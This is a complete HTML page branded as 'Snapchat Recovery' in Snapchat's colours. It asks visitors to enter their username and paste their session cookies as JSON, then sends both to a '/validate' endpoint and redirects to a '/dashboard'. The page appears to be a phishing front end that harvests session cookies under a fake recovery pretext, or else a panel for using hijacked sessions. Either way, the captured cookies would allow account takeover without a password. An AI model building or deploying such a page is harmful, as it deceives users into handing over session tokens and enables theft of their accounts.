<!DOCTYPE html>
<html>
<head>
<title>Snapchat Recovery</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { background: #FFFC00; font-family: -apple-system, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
.container { background: white; padding: 30px; border-radius: 24px; width: 100%; max-width: 500px; }
h1 { font-size: 24px; margin-bottom: 8px; }
.subtitle { color: #666; font-size: 14px; margin-bottom: 20px; }
input, textarea { width: 100%; padding: 14px; border: 2px solid #e0e0e0; border-radius: 12px; margin-bottom: 12px; font-size: 14px; outline: none; }
input:focus, textarea:focus { border-color: #FFFC00; }
textarea { height: 150px; font-family: monospace; font-size: 12px; }
button { background: #000; color: #FFFC00; padding: 16px; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; }
#result { margin-top: 16px; padding: 16px; border-radius: 12px; font-size: 14px; display: none; }
#result.success { background: #e8f5e9; color: #2e7d32; display: block; }
#result.error { background: #ffebee; color: #c62828; display: block; }
</style>
</head>
<body>
<div class="container">
<h1>🔒 Recovery</h1>
<p class="subtitle">Enter your username + paste cookies</p>

<input type="text" id="username" placeholder="Your Snapchat username">
<textarea id="cookies" placeholder='Paste JSON cookies here...'></textarea>

<button onclick="validate()" id="btn">Validate</button>
<div id="result"></div>
</div>

<script>
async function validate() {
    const username = document.getElementById('username').value.trim();
    const cookies = document.getElementById('cookies').value;
    const result = document.getElementById('result');
    
    if (!username) { result.className = 'error'; result.textContent = '❌ Enter your Snapchat username'; result.style.display = 'block'; return; }
    if (!cookies) { result.className = 'error'; result.textContent = '❌ Paste cookies'; result.style.display = 'block'; return; }
    
    let cookieData;
    try { cookieData = JSON.parse(cookies); } catch(e) { cookieData = cookies; }
    
    document.getElementById('btn').disabled = true;
    document.getElementById('btn').textContent = 'Checking...';
    
    const resp = await fetch('/validate', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({cookies: cookieData, username: username})
    });
    
    const data = await resp.json();
    
    if (data.success) {
        result.className = 'success';
        result.innerHTML = '✅ @' + data.username + '<br><small>Going to dashboard...</small>';
        result.style.display = 'block';
        setTimeout(() => window.location.href = '/dashboard', 1000);
    } else {
        result.className = 'error';
        result.textContent = '❌ ' + data.error;
        result.style.display = 'block';
    }
    
    document.getElementById('btn').disabled = false;
    document.getElementById('btn').textContent = 'Validate';
}
</script>
</body>
</html>
